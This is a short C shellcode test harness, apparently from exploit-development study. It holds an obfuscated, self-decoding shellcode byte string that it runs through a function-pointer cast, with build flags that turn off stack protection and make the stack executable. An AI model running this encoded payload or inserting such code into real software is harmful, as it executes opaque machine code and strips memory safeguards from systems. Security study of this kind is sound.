/*
// Author: Alessio Parzian
// Filename: test_shell.c
//
// Test your shellcode. Replace shellcode variable value with your own shell, compile and execute.
// Compile with:
// 	gcc $file_name -fno-stack-protector -z execstack -o $out_name
*/

#include <stdio.h>

// Use an array instead of a pointer because compiler does consider the array as mutable (this implies you can modify it at runtime). For pointers to literal this is not the case unless specific flag is passed to the compiler. This is very important when modifing at runtime the shellcode.
unsigned char shellcode[] = "\xeb\x2d\x5e\x31\xdb\x31\xc9\x31\xd2\xb1\x32\x8a\x1e\x80\xf3\xbb\x80\xe3\xff\x8a\x16\x80\xf2\xbb\x80\xe2\xff\xc0\xc3\x02\x80\xe3\xff\xc0\xca\x06\x20\xd3\xf6\xd3\x88\x1e\x46\xe2\xde\xeb\x05\xe8\xce\xff\xff\xff\xbe\xc2\xd3\x08\xb2\x66\xd3\x06\x26\xd9\xc6\x26\xd3\xc7\x27\xc3\x27\xd7\xc6\x27\xd1\xc7\x08\x74\x68\x86\x37\x64\x7e\x3c\xbb\xbb\xbb\x8f\xdc\x1e\xdf\x8f\xdc\x1c\x98\x5e\x14\xd4\xd4\xd4\xd4\x94\x94\x94\x94";

int main (){
	void (*shell)(void) = (void(*)(void)) shellcode;
	shell();
}
